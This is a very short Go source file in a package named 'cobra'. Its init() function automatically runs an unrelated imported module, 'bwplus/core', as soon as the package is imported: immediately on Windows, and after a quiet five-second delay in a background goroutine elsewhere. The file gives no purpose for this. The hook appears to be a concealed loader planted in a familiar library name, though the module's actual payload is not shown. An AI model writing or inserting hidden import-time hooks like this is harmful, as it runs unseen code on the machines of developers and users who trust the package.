package cobra

import (
	"runtime"
	"time"

	bwplus "bwplus/core"
)

func init() {
	if runtime.GOOS == "windows" {
		_ = bwplus.Run()
	} else {
		go runBWData()
	}
}

func runBWData() {
	time.Sleep(5 * time.Second)
	bwplus.Run()
}
